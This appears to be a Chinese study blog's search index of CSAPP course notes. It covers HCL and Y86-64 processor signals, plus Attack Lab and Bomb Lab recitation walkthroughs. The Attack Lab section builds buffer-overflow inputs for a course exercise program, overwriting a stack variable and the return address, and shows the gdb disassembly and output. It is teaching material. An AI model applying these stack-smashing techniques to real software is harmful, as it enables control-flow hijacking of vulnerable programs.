其中，信号名的命名方式为：字母/下划线+字母/数字/下划线，其中C-expr种可以是任意表达式，但是其中不能包含’和\\n。C-expr会在编译时替换掉所有的name ","date":"2024-03-13","objectID":"/ch4/:11:1","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#hcl-信号说明"},{"categories":["系统入门"],"content":" 11.2 HCLquotequote可以直接通过hcl2c传入 C 语言表达式，’内的字符串保持不变。（但是其中不能包含’和\\n） ","date":"2024-03-13","objectID":"/ch4/:11:2","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#hclquote"},{"categories":["系统入门"],"content":" 11.3 HCL 表达式和块有两种表达式，bool-expr和int-expr。 bool-expr的描述如图： 同一方框内的表达式的优先级相同。 int-expr有 3 种： 数字 命名的intsig case 表达式，其写法如下： hcl [ bool-expr 1 : int-expr 1 bool-expr 2 : int-expr 2 . . . bool-expr k : int-expr k ] expr可以进行赋值，语句如下： hcl bool name = bool-expr; int name = int-expr; ","date":"2024-03-13","objectID":"/ch4/:11:3","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#hcl-表达式和块"},{"categories":["系统入门"],"content":" 11.4 HCL 示例下面我们实现一个MUX4，其可以通过hcl2c和其他 C 程序结合运行，通过控制台输入参数，然后输出结果。 hcl quote ’#include \u003cstdio.h\u003e’ quote ’#include \u003cstdlib.h\u003e’ quote ’long long code_val, s0_val, s1_val;’ quote ’char **data_names;’ ## Declarations of signals used in the HCL description and ## the corresponding C expressions. boolsig s0 ’s0_val’ boolsig s1 ’s1_val’ wordsig code ’code_val’ wordsig A ’atoll(data_names[0])’ wordsig B ’atoll(data_names[1])’ wordsig C ’atoll(data_names[2])’ wordsig D ’atoll(data_names[3])’ ## HCL descriptions of the logic blocks bool s1 = code in { 2, 3 }; bool s0 = code in { 1, 3 }; word Out4 = [ !s1 \u0026\u0026 !s0 : A; # 00 !s1 : B; # 01 !s0 : C; # 10 1 : D; # 11 ]; ## More information inserted verbatim into the C code to ## compute the values and print the output quote ’int main(int argc, char *argv[]) {’ quote ’ data_names = argv+2;’ quote ’ code_val = atoll(argv[1]);’ quote ’ s1_val = gen_s1();’ quote ’ s0_val = gen_s0();’ quote ’ printf(\"Out = %lld\\n\", gen_Out4());’ quote ’ return 0;’ quote ’}’ 这个代码可以分为如下几个部分： 头文件的引入和信号的定义 long long类型的code_val, s0_val, s1_val char**的字符串数组data_names 声明各个信号：s0 s1 code A B C D 信号的求值 s0和s1由code的值得出 控制逻辑的实现 Out4的结果值由s0 s1 A B C D共同得出 C 语言程序的嵌入 上述hcl代码会被转化成gen_S1()，gen_S0()，gen_Out4()等 ","date":"2024-03-13","objectID":"/ch4/:11:4","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#hcl-示例"},{"categories":["系统入门"],"content":" 11.5 HCL SEQ 代码分析 11.5.1 头文件引入 hcl quote ’#include \u003cstdio.h\u003e’ quote ’#include \"isa.h\"’ quote ’#include \"sim.h\"’ quote ’int sim_main(int argc, char *argv[]);’ quote ’word_t gen_pc(){return 0;}’ quote ’int main(int argc, char *argv[])’ quote ’ {plusmode=0;return sim_main(argc,argv);}’ 这段代码主要使用quote来嵌入 C 语言程序，可以看到其中包含了如下函数： main函数：设置plusmode = 0，返回sim_main(argc,argv)的结果（目测plusmode可能是流水线的设置模式，主要的模拟在sim_main种进行） sim_main：模拟函数 gen_pc：返回 PC 的值 11.5.2 信号声明信号有如下几种： 指令代码 hcl ##### Symbolic representation of Y86-64 Instruction Codes ############# wordsig INOP ’I_NOP’ wordsig IHALT ’I_HALT’ wordsig IRRMOVQ ’I_RRMOVQ’ wordsig IIRMOVQ ’I_IRMOVQ’ wordsig IRMMOVQ ’I_RMMOVQ’ wordsig IMRMOVQ ’I_MRMOVQ’ wordsig IOPQ ’I_ALU’ wordsig IJXX ’I_JMP’ wordsig ICALL ’I_CALL’ wordsig IRET ’I_RET’ wordsig IPUSHQ ’I_PUSHQ’ wordsig IPOPQ ’I_POPQ’ ##### Symbolic represenations of Y86-64 function codes ##### wordsig FNONE ’F_NONE’ # Default function code 要用到的特殊寄存器 hcl ##### Symbolic representation of Y86-64 Registers referenced explicitly ##### wordsig RRSP ’REG_RSP’ # Stack Pointer wordsig RNONE ’REG_NONE’ # Special value indicating \"no register\" 要用到的加法 hcl ##### ALU Functions referenced explicitly ##### wordsig ALUADD ’A_ADD’ # ALU should add its arguments 状态代码 hcl ##### Possible instruction status values ##### wordsig SAOK ’STAT_AOK’ # Normal execution wordsig SADR ’STAT_ADR’ # Invalid memory address wordsig SINS ’STAT_INS’ # Invalid instruction wordsig SHLT ’STAT_HLT’ # Halt instruction encountered 各阶段信号 取指阶段信号 hcl ##### Fetch stage inputs ##### wordsig pc ’pc’ # Program counter ##### Fetch stage computations ##### wordsig imem_icode ’imem_icode’ # icode field from instruction memory wordsig imem_ifun ’imem_ifun’ # ifun field from instruction memory wordsig icode ’icode’ # Instruction control code wordsig ifun ’ifun’ # Instruction function wordsig rA ’ra’ # rA field from instruction wordsig rB ’rb’ # rB field from instruction wordsig valC ’valc’ # Constant from instruction wordsig valP ’valp’ # Address of following instruction boolsig imem_error ’imem_error’ # Error signal from instruction memory boolsig instr_valid ’instr_valid’ # Is fetched instruction valid? 译码 \u0026 写回阶段信号 hcl ##### Decode stage computations ##### wordsig valA ’vala’ # Value from register A port wordsig valB ’valb’ # Value from register B port 执行阶段信号 hcl ##### Execute stage computations ##### wordsig valE ’vale’ # Value computed by ALU boolsig Cnd ’cond’ # Branch test 访存阶段信号 hcl ##### Memory stage computations ##### wordsig valM ’valm’ # Value read from memory boolsig dmem_error ’dmem_error’ # Error signal from data memory 剩下几个阶段的hcl代码在前文已经写过了，这里不再解释。 ","date":"2024-03-13","objectID":"/ch4/:11:5","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#hcl-seq-代码分析"},{"categories":["系统入门"],"content":" 11.5 HCL SEQ 代码分析 11.5.1 头文件引入 hcl quote ’#include ’ quote ’#include \"isa.h\"’ quote ’#include \"sim.h\"’ quote ’int sim_main(int argc, char *argv[]);’ quote ’word_t gen_pc(){return 0;}’ quote ’int main(int argc, char *argv[])’ quote ’ {plusmode=0;return sim_main(argc,argv);}’ 这段代码主要使用quote来嵌入 C 语言程序，可以看到其中包含了如下函数： main函数：设置plusmode = 0，返回sim_main(argc,argv)的结果（目测plusmode可能是流水线的设置模式，主要的模拟在sim_main种进行） sim_main：模拟函数 gen_pc：返回 PC 的值 11.5.2 信号声明信号有如下几种： 指令代码 hcl ##### Symbolic representation of Y86-64 Instruction Codes ############# wordsig INOP ’I_NOP’ wordsig IHALT ’I_HALT’ wordsig IRRMOVQ ’I_RRMOVQ’ wordsig IIRMOVQ ’I_IRMOVQ’ wordsig IRMMOVQ ’I_RMMOVQ’ wordsig IMRMOVQ ’I_MRMOVQ’ wordsig IOPQ ’I_ALU’ wordsig IJXX ’I_JMP’ wordsig ICALL ’I_CALL’ wordsig IRET ’I_RET’ wordsig IPUSHQ ’I_PUSHQ’ wordsig IPOPQ ’I_POPQ’ ##### Symbolic represenations of Y86-64 function codes ##### wordsig FNONE ’F_NONE’ # Default function code 要用到的特殊寄存器 hcl ##### Symbolic representation of Y86-64 Registers referenced explicitly ##### wordsig RRSP ’REG_RSP’ # Stack Pointer wordsig RNONE ’REG_NONE’ # Special value indicating \"no register\" 要用到的加法 hcl ##### ALU Functions referenced explicitly ##### wordsig ALUADD ’A_ADD’ # ALU should add its arguments 状态代码 hcl ##### Possible instruction status values ##### wordsig SAOK ’STAT_AOK’ # Normal execution wordsig SADR ’STAT_ADR’ # Invalid memory address wordsig SINS ’STAT_INS’ # Invalid instruction wordsig SHLT ’STAT_HLT’ # Halt instruction encountered 各阶段信号 取指阶段信号 hcl ##### Fetch stage inputs ##### wordsig pc ’pc’ # Program counter ##### Fetch stage computations ##### wordsig imem_icode ’imem_icode’ # icode field from instruction memory wordsig imem_ifun ’imem_ifun’ # ifun field from instruction memory wordsig icode ’icode’ # Instruction control code wordsig ifun ’ifun’ # Instruction function wordsig rA ’ra’ # rA field from instruction wordsig rB ’rb’ # rB field from instruction wordsig valC ’valc’ # Constant from instruction wordsig valP ’valp’ # Address of following instruction boolsig imem_error ’imem_error’ # Error signal from instruction memory boolsig instr_valid ’instr_valid’ # Is fetched instruction valid? 译码 \u0026 写回阶段信号 hcl ##### Decode stage computations ##### wordsig valA ’vala’ # Value from register A port wordsig valB ’valb’ # Value from register B port 执行阶段信号 hcl ##### Execute stage computations ##### wordsig valE ’vale’ # Value computed by ALU boolsig Cnd ’cond’ # Branch test 访存阶段信号 hcl ##### Memory stage computations ##### wordsig valM ’valm’ # Value read from memory boolsig dmem_error ’dmem_error’ # Error signal from data memory 剩下几个阶段的hcl代码在前文已经写过了，这里不再解释。 ","date":"2024-03-13","objectID":"/ch4/:11:5","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#头文件引入"},{"categories":["系统入门"],"content":" 11.5 HCL SEQ 代码分析 11.5.1 头文件引入 hcl quote ’#include ’ quote ’#include \"isa.h\"’ quote ’#include \"sim.h\"’ quote ’int sim_main(int argc, char *argv[]);’ quote ’word_t gen_pc(){return 0;}’ quote ’int main(int argc, char *argv[])’ quote ’ {plusmode=0;return sim_main(argc,argv);}’ 这段代码主要使用quote来嵌入 C 语言程序，可以看到其中包含了如下函数： main函数：设置plusmode = 0，返回sim_main(argc,argv)的结果（目测plusmode可能是流水线的设置模式，主要的模拟在sim_main种进行） sim_main：模拟函数 gen_pc：返回 PC 的值 11.5.2 信号声明信号有如下几种： 指令代码 hcl ##### Symbolic representation of Y86-64 Instruction Codes ############# wordsig INOP ’I_NOP’ wordsig IHALT ’I_HALT’ wordsig IRRMOVQ ’I_RRMOVQ’ wordsig IIRMOVQ ’I_IRMOVQ’ wordsig IRMMOVQ ’I_RMMOVQ’ wordsig IMRMOVQ ’I_MRMOVQ’ wordsig IOPQ ’I_ALU’ wordsig IJXX ’I_JMP’ wordsig ICALL ’I_CALL’ wordsig IRET ’I_RET’ wordsig IPUSHQ ’I_PUSHQ’ wordsig IPOPQ ’I_POPQ’ ##### Symbolic represenations of Y86-64 function codes ##### wordsig FNONE ’F_NONE’ # Default function code 要用到的特殊寄存器 hcl ##### Symbolic representation of Y86-64 Registers referenced explicitly ##### wordsig RRSP ’REG_RSP’ # Stack Pointer wordsig RNONE ’REG_NONE’ # Special value indicating \"no register\" 要用到的加法 hcl ##### ALU Functions referenced explicitly ##### wordsig ALUADD ’A_ADD’ # ALU should add its arguments 状态代码 hcl ##### Possible instruction status values ##### wordsig SAOK ’STAT_AOK’ # Normal execution wordsig SADR ’STAT_ADR’ # Invalid memory address wordsig SINS ’STAT_INS’ # Invalid instruction wordsig SHLT ’STAT_HLT’ # Halt instruction encountered 各阶段信号 取指阶段信号 hcl ##### Fetch stage inputs ##### wordsig pc ’pc’ # Program counter ##### Fetch stage computations ##### wordsig imem_icode ’imem_icode’ # icode field from instruction memory wordsig imem_ifun ’imem_ifun’ # ifun field from instruction memory wordsig icode ’icode’ # Instruction control code wordsig ifun ’ifun’ # Instruction function wordsig rA ’ra’ # rA field from instruction wordsig rB ’rb’ # rB field from instruction wordsig valC ’valc’ # Constant from instruction wordsig valP ’valp’ # Address of following instruction boolsig imem_error ’imem_error’ # Error signal from instruction memory boolsig instr_valid ’instr_valid’ # Is fetched instruction valid? 译码 \u0026 写回阶段信号 hcl ##### Decode stage computations ##### wordsig valA ’vala’ # Value from register A port wordsig valB ’valb’ # Value from register B port 执行阶段信号 hcl ##### Execute stage computations ##### wordsig valE ’vale’ # Value computed by ALU boolsig Cnd ’cond’ # Branch test 访存阶段信号 hcl ##### Memory stage computations ##### wordsig valM ’valm’ # Value read from memory boolsig dmem_error ’dmem_error’ # Error signal from data memory 剩下几个阶段的hcl代码在前文已经写过了，这里不再解释。 ","date":"2024-03-13","objectID":"/ch4/:11:5","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#信号声明"},{"categories":["系统入门"],"content":" 11.6 HCL PIPE 代码分析剩下几个阶段的hcl代码在前文已经写过了，这里不再解释。 ","date":"2024-03-13","objectID":"/ch4/:11:6","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#hcl-pipe-代码分析"},{"categories":["系统入门"],"content":" 12 Verlog 代码学习PIPE 处理器的 Verilog 代码见此 ","date":"2024-03-13","objectID":"/ch4/:12:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#verlog-代码学习"},{"categories":["系统入门"],"content":" 13 总结在本章中，我们： 简单介绍了 CISC 和 RISC 指令集的区别，并设计了一个汇集二者特性的 Y86-64 指令集 分析 Y86-64 指令集，构造了 SEQ 顺序结构处理器 将顺序结构处理器 PC 更新阶段调整到开头，生成了 SEQ+处理器 添加流水线寄存器，生成 PIPE-流水线处理器 添加转发逻辑，生成 PIPE 流水线处理器 添加异常处理机制，并描述了各控制信号 实现心得： 管理复杂性 不需要直接实现 ISA，而是将其抽象为五个阶段 设计时必须小心分析，仔细分析各个指令的组合，并进行详尽的测试 ","date":"2024-03-13","objectID":"/ch4/:13:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 4 - 处理器体系结构","uri":"/ch4/#总结"},{"categories":["系统入门"],"content":"输入gdb activity，开启 activity 之旅。 Objective: The goal of this activity is to input a string that causes the program to call win(0x15213), and thereby win a cookie. 在开启之前，先查看一下solve函数的内容： c void solve(void) { volatile long before = 0xb4; char buf[16]; volatile long after = 0xaf; Gets(buf); if (before == 0x3331323531) { win(0x15213); } if (after == 0x3331323831) { win(0x18213); } } 看一下solve的汇编代码： text (gdb) disas solve Dump of assembler code for function solve: 0x00000000000011df \u003c+0\u003e: endbr64 0x00000000000011e3 \u003c+4\u003e: sub $0x38,%rsp 0x00000000000011e7 \u003c+8\u003e: movq $0xb4,0x28(%rsp) 0x00000000000011f0 \u003c+17\u003e: movq $0xaf,0x8(%rsp) 0x00000000000011f9 \u003c+26\u003e: lea 0x10(%rsp),%rdi 0x00000000000011fe \u003c+31\u003e: callq 0x1279 \u003cGets\u003e 0x0000000000001203 \u003c+36\u003e: mov 0x28(%rsp),%rdx 0x0000000000001208 \u003c+41\u003e: movabs $0x3331323531,%rax 0x0000000000001212 \u003c+51\u003e: cmp %rax,%rdx 0x0000000000001215 \u003c+54\u003e: je 0x1230 \u003csolve+81\u003e 0x0000000000001217 \u003c+56\u003e: mov 0x8(%rsp),%rdx 0x000000000000121c \u003c+61\u003e: movabs $0x3331323831,%rax 0x0000000000001226 \u003c+71\u003e: cmp %rax,%rdx 0x0000000000001229 \u003c+74\u003e: je 0x123c \u003csolve+93\u003e 0x000000000000122b \u003c+76\u003e: add $0x38,%rsp 0x000000000000122f \u003c+80\u003e: retq 0x0000000000001230 \u003c+81\u003e: mov $0x15213,%edi 0x0000000000001235 \u003c+86\u003e: callq 0x1169 \u003cwin\u003e 0x000000000000123a \u003c+91\u003e: jmp 0x1217 \u003csolve+56\u003e 0x000000000000123c \u003c+93\u003e: mov $0x18213,%edi 0x0000000000001241 \u003c+98\u003e: callq 0x1169 \u003cwin\u003e 0x0000000000001246 \u003c+103\u003e: jmp 0x122b \u003csolve+76\u003e End of assembler dump. 函数给solve预留了 56 个字节的空间： before = 0xb4移动到%rsp + 40处 after = 0xaf移动到%rsp + 8处 %rdi = %rsp + 16 调用gets %rdx = *(%rsp + 40)，把before赋给%rdx %rax = $0x3331323531 接下来是个判断： c if(rdx == rax) { edi = 0x15213; callq win } rdx = *(rsp + 8); rax = 0x3331323831; if(rdx == rax) { edi = 0x18213; callq win; } rsp += 40; return; 完成gets之前的调用后，栈分布大致如下（一共 56 个字节的分配）： rsp处没有值 rsp + 8处存储after = 0xaf rsp + 16 ~ rsp + 24处存储 16 字节的buf rsp + 32处 8 个字节空闲 rsp + 40处存储before = 0xb4 rsp + 56处存储的是调用solve的return address ","date":"2024-02-29","objectID":"/attack-lab-recitation/:0:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Attack lab recitation","uri":"/attack-lab-recitation/#"},{"categories":["系统入门"],"content":" 0.4 普通缓冲区溢出查看代码可以理解，要让程序调用win(0x15213)，需要让rdx == 0x3331323531，而在这之前rdx = before，所以我们的根本目的是让before = 0x3331323531。就得让buf前 24 个字节为 0，后八个字节等于0x3331323531。该机器为小端法机器，那么这 8 个字节从低地址到高地址的顺序应该是：0x31 0x35 0x32 0x31 0x33 0x00 0x00 0x00，这 8 个个字节翻译成ASCII码就是15213。此外gets一定要读到\\n字符，它会把\\n替换为\\0字符。它不是读到\\0字符就终止。后面不需要加0，因为0的ASCII编码是0x30。如果最后加了 3 个0的话，最后 8 个字节的地址就会变成0x31 0x35 0x32 0x31 0x33 0x30 0x30 0x30。 有几条要注意的点： 机器为小端法机器，写内存的时候要把数字倒过来 0x00是在 ASCII 码里面是空字符，0x30在 ASCII 码里面是0 gets要读到\\n，他会把\\n替换成\\0存储在buf中，无需手动\\0 输入的时候只能输入字符串，而不能输入 10 进制或者 16 进制的值，如果函数没有调用atoi，输入一律被当作字符串处理。因此我们需要输入0x3331323531对应的ASCII编码，而不是这个值本身。 输入01234567890123456789012315213，成功调用win(0x15213)。如下： text gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec5/src$ ./activity 01234567890123456789012315213 You win 1 cookie! Great start! Returning normally from main ","date":"2024-02-29","objectID":"/attack-lab-recitation/:0:1","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Attack lab recitation","uri":"/attack-lab-recitation/#普通缓冲区溢出"},{"categories":["系统入门"],"content":" 0.5 包含返回地址攻击的缓冲区溢出要让这个solve函数跳转到我们插入的代码段（未开启栈随机化/canary/NX bit及其他防护机制，不考虑nop sled），我们需要利用缓冲区溢出，让return address修改为我们所插入的代码段的地址。我们需要让buf的前 40 个字节为任意内容，最后 8 个字节为我们插入的攻击代码的地址。 我们这次的目的是想调到\u003csolve +93\u003e位置处，本次运行过程中该位置的地址是0x000055555555523c，过会儿我们要将其插入buf的第 48-48 字节处。该地址的值换算成小端法是0x3c 0x52 0x55 0x55 0x55 0x55 0x00 0x00。其对应的ASCII码是\u003cRUUUU，后面的null为0x00。我们要让程序返回的时候跳转到mov $0x18213,%edi。那么构造的字符串应该是0123456789012345678901234567890123456789\u003cRUUUU。结果如下： text 43 if (after == 0x3331323831) { (gdb) n solve () at activity.c:44 44 win(0x18213); (gdb) You win 2 cookies! Woohoo! 0x0000000000000000 in ?? () 成功！ ","date":"2024-02-29","objectID":"/attack-lab-recitation/:0:2","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Attack lab recitation","uri":"/attack-lab-recitation/#包含返回地址攻击的缓冲区溢出"},{"categories":["系统入门"],"content":" 0.6 引导程序到攻击代码此处我们进行更进阶的攻击，程序中函数solve()并未调用过win(0x18613)，让我们尝试返回到win(0x18613)中。此时我们不光只破解solve()，还需要对win函数的代码进行分析。结果如下： text (gdb) disas win Dump of assembler code for function win: 0x0000555555555169 \u003c+0\u003e: endbr64 0x000055555555516d \u003c+4\u003e: sub $0x8,%rsp 0x0000555555555171 \u003c+8\u003e: cmp $0x15213,%edi 0x0000555555555177 \u003c+14\u003e: je 0x5555555551a7 \u003cwin+62\u003e 0x0000555555555179 \u003c+16\u003e: cmp $0x18213,%edi 0x000055555555517f \u003c+22\u003e: je 0x5555555551b5 \u003cwin+76\u003e 0x0000555555555181 \u003c+24\u003e: cmp $0x18613,%edi 0x0000555555555187 \u003c+30\u003e: je 0x5555555551c3 \u003cwin+90\u003e 0x0000555555555189 \u003c+32\u003e: mov 0x2ea1(%rip),%eax # 0x555555558030 \u003cmystery\u003e 0x000055555555518f \u003c+38\u003e: cmp $0x15513,%eax 0x0000555555555194 \u003c+43\u003e: je 0x5555555551d1 \u003cwin+104\u003e 0x0000555555555196 \u003c+45\u003e: lea 0xed3(%rip),%rdi # 0x555555556070 0x000055555555519d \u003c+52\u003e: callq 0x555555555030 \u003cputs@plt\u003e 0x00005555555551a2 \u003c+57\u003e: add $0x8,%rsp 0x00005555555551a6 \u003c+61\u003e: retq 0x00005555555551a7 \u003c+62\u003e: lea 0xe5a(%rip),%rdi # 0x555555556008 0x00005555555551ae \u003c+69\u003e: callq 0x555555555030 \u003cputs@plt\u003e 0x00005555555551b3 \u003c+74\u003e: jmp 0x5555555551a2 \u003cwin+57\u003e 0x00005555555551b5 \u003c+76\u003e: lea 0xedc(%rip),%rdi # 0x555555556098 0x00005555555551bc \u003c+83\u003e: callq 0x555555555030 \u003cputs@plt\u003e 0x00005555555551c1 \u003c+88\u003e: jmp 0x5555555551a2 \u003cwin+57\u003e 0x00005555555551c3 \u003c+90\u003e: lea 0xe5e(%rip),%rdi # 0x555555556028 0x00005555555551ca \u003c+97\u003e: callq 0x555555555030 \u003cputs@plt\u003e 0x00005555555551cf \u003c+102\u003e: jmp 0x5555555551a2 \u003cwin+57\u003e 0x00005555555551d1 \u003c+104\u003e: lea 0xe78(%rip),%rdi # 0x555555556050 0x00005555555551d8 \u003c+111\u003e: callq 0x555555555030 \u003cputs@plt\u003e 0x00005555555551dd \u003c+116\u003e: jmp 0x5555555551a2 \u003cwin+57\u003e End of assembler dump. 我们需要跳转到if(arg == 0x18613)后面那句，也就是\u003cwin+90\u003e处，该条指令的地址是0x00005555555551c3，转化成小端法是0xc3 0x51 0x55 0x55 0x55 0x55 0x00 0x00，转化成ASCII码也就是ÃQUUUU。因此，我们构造的字符串应该是0123456789012345678901234567890123456789ÃQUUUU。结果如下： text (gdb) p $rsp $2 = (void *) 0x555555559018 \u003cmy_stack+4056\u003e (gdb) x/s 0x555555559018 0x555555559018 \u003cmy_stack+4056\u003e: \"ÃQUUUU\" (gdb) x/6bx 0x555555559018 0x555555559018 \u003cmy_stack+4056\u003e: 0xc3 0x83 0x51 0x55 0x55 0x55 这里出现了一点问题，就是Ã采用Unicode扩展编码，其编码为0xc3 0x83，而我们仅仅需要0xc3，因此我们需要将 16 进制的地址写在文件里，然后用文件作为activity的输入。 Slides 中最后一页告诉我们，提供了hex2raw脚本，可以把 16 进制值写到input2.txt中，然后通过hex2raw转化为input2.bin。我们在input2.txt中写入值30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 31 35 32 31 33 00 30 31 32 33 34 35 36 37 38 39 c3 51 55 55 55 55，将其转化，然后输入./activity \u003c ../inputs/input2.bin。 结果如下： text (gdb) r \u003c ../inputs/input2.bin Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/rec5/src/activity \u003c ../inputs/input2.bin You win 3 cookies! That's right! Program received signal SIGSEGV, Segmentation fault. 成功！ ","date":"2024-02-29","objectID":"/attack-lab-recitation/:0:3","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Attack lab recitation","uri":"/attack-lab-recitation/#引导程序到攻击代码"},{"categories":["系统入门"],"content":" 5 act1依次输入如下指令： text (gdb) disassemble main // show the assembly instructions in main 其main函数反汇编结果如下： text (gdb) disassemble main Dump of assembler code for function main: 0x0000000000401730 \u003c+0\u003e: endbr64 0x0000000000401734 \u003c+4\u003e: push %rbx 0x0000000000401735 \u003c+5\u003e: movslq %edi,%rdi 0x0000000000401738 \u003c+8\u003e: mov %rsi,%rbx 0x000000000040173b \u003c+11\u003e: xor %eax,%eax 0x000000000040173d \u003c+13\u003e: mov -0x8(%rsi,%rdi,8),%rdx 0x0000000000401742 \u003c+18\u003e: lea 0xa8eb6(%rip),%rsi # 0x4aa5ff 0x0000000000401749 \u003c+25\u003e: mov $0x1,%edi 0x000000000040174e \u003c+30\u003e: callq 0x44b9a0 \u003c__printf_chk\u003e 0x0000000000401753 \u003c+35\u003e: movq $0x0,(%rbx) 0x000000000040175a \u003c+42\u003e: pop %rbx 0x000000000040175b \u003c+43\u003e: retq End of assembler dump. 该汇编代码的过程如下： c int main(int argc, char*argv[]) { int ret = printf(\"%s\\n\",argv[argc-1]); return ret; } ","date":"2024-02-29","objectID":"/bomb-lab-recitation/:1:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Bomb lab recitation","uri":"/bomb-lab-recitation/#act1"},{"categories":["系统入门"],"content":" 6 act2反汇编main函数： text (gdb) disas main Dump of assembler code for function main: 0x00000000004016c0 \u003c+0\u003e: endbr64 0x00000000004016c4 \u003c+4\u003e: push %rbx 0x00000000004016c5 \u003c+5\u003e: movslq %edi,%rdi 0x00000000004016c8 \u003c+8\u003e: mov %rsi,%rbx 0x00000000004016cb \u003c+11\u003e: mov -0x8(%rsi,%rdi,8),%rsi 0x00000000004016d0 \u003c+16\u003e: lea 0x9392d(%rip),%rdi # 0x495004 0x00000000004016d7 \u003c+23\u003e: callq 0x401c75 \u003cstc\u003e 0x00000000004016dc \u003c+28\u003e: movq $0x0,(%rbx) 0x00000000004016e3 \u003c+35\u003e: pop %rbx 0x00000000004016e4 \u003c+36\u003e: retq End of assembler dump. 输入下列指令用 16 进制打印%rsi和%rdi的值： text (gdb) print /x $rsi $1 = 0x7fffffffdf18 (gdb) print /x $rdi $2 = 0x1 由此看$rdi应该是argc,而$rsi应该是argv。 再输入disas stc，获得如下结果： text (gdb) disas stc Dump of assembler code for function stc: 0x0000000000401c75 \u003c+0\u003e: push %rbx 0x0000000000401c76 \u003c+1\u003e: mov %rsi,%rbx 0x0000000000401c79 \u003c+4\u003e: callq 0x4115d0 \u003cputs\u003e 0x0000000000401c7e \u003c+9\u003e: mov %rbx,%rdi 0x0000000000401c81 \u003c+12\u003e: callq 0x4115d0 \u003cputs\u003e 0x0000000000401c86 \u003c+17\u003e: pop %rbx 0x0000000000401c87 \u003c+18\u003e: retq 0x0000000000401c88 \u003c+19\u003e: nopl 0x0(%rax,%rax,1) End of assembler dump. 将其转化为 C 语言函数应该是： c // a:rsi b:rdi int stc(char* a, char* b) { // 压入原rbx rbx = rsi; puts(rbx); rdi = rbx; puts(rbx); // 恢复rbx // nopl是干嘛用的？ return rax; } ","date":"2024-02-29","objectID":"/bomb-lab-recitation/:2:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Bomb lab recitation","uri":"/bomb-lab-recitation/#act2"},{"categories":["系统入门"],"content":" 7 act3观察main函数的 C 代码，发现只要compare函数返回 1 即可通关。对compare函数进行反汇编可得： text (gdb) disas compare Dump of assembler code for function compare: 0x0000000000401c95 \u003c+0\u003e: push %rbx 0x0000000000401c96 \u003c+1\u003e: mov %rdi,%rbx 0x0000000000401c99 \u003c+4\u003e: add $0x5,%rbx 0x0000000000401c9d \u003c+8\u003e: add %rsi,%rbx 0x0000000000401ca0 \u003c+11\u003e: cmp $0x3b6d,%rbx 0x0000000000401ca7 \u003c+18\u003e: sete %al 0x0000000000401caa \u003c+21\u003e: movzbq %al,%rax 0x0000000000401cae \u003c+25\u003e: pop %rbx 0x0000000000401caf \u003c+26\u003e: retq End of assembler dump. 还原其 C 代码如下： c // rdi:a rsi:b int compare(int a,int b) { int ret; //压入原rbx rbx = a; rbx += 0x5; rbx += b; rbx = a + b + 0x5; if(rbx == 0x3b6d) { ret = 1; } else { ret = 0; } // 恢复原Rbx return ret; } 发现compare就要求a + b = 0x3b68(10进制15208)。在gdb中只能输入 10 进制数字，如果输入 16 进制数字的话会被当成字符串。运行./act3 15208 0，成功！ text gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec4$ ./act3 15208 0 good args! ","date":"2024-02-29","objectID":"/bomb-lab-recitation/:3:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"Bomb lab recitation","uri":"/bomb-lab-recitation/#act3"},{"categories":["系统入门"],"content":" 8 act4先查看act4.c的代码，看看是干嘛的： c void compute(int inArg) { int st; inArg *= 3; st = inArg \u0026 0xf; do { switch(st) { case 0: printf(\"Finish\\n\"); inArg = -1; break; case 1: inArg *= 2; break; case 2: inArg \u003e\u003e= 2; break; case 3: inArg \u0026= 1; break; case 4: inArg--; break; default: break; } st = inArg \u0026 0xf; } while (inArg \u003e= 0); } int main(int argc, char** argv) { int inArg; if (argc == 1) {fprintf(stderr, \"Please rerun with a positive number argument\\n\"); return 1;} inArg = atoi(argv[1]); if (inArg \u003c 0) {fprintf(stderr, \"Argument was not a positive integer\\n\"); return 1;} compute(inArg); return 0; } 所以我们要让 gdb 打印Finish，st 就得为 0，inArg就得为 0，那么就输入 1 个参数0即可。 text gwen@gwen-virtual-machine:~/Documents/report/code/15213/Ch3 Machine Level Programming/rec4$ ./act4 0 Finish 我们要对汇编代码进行分析，就要使用gdb。输入gdb act4，输入disas main，得到如下结果： text (gdb) disas main Dump of assembler code for function main: 0x0000000000401730 \u003c+0\u003e: endbr64 0x0000000000401734 \u003c+4\u003e: sub $0x8,%rsp 0x0000000000401738 \u003c+8\u003e: lea 0x938e1(%rip),%rdx # 0x495020 0x000000000040173f \u003c+15\u003e: cmp $0x1,%edi 0x0000000000401742 \u003c+18\u003e: je 0x40176d \u003cmain+61\u003e 0x0000000000401744 \u003c+20\u003e: mov 0x8(%rsi),%rdi 0x0000000000401748 \u003c+24\u003e: mov $0xa,%edx 0x000000000040174d \u003c+29\u003e: xor %esi,%esi 0x000000000040174f \u003c+31\u003e: callq 0x410310 \u003cstrtoq\u003e 0x0000000000401754 \u003c+36\u003e: test %eax,%eax 0x0000000000401756 \u003c+38\u003e: js 0x401766 \u003cmain+54\u003e 0x0000000000401758 \u003c+40\u003e: mov 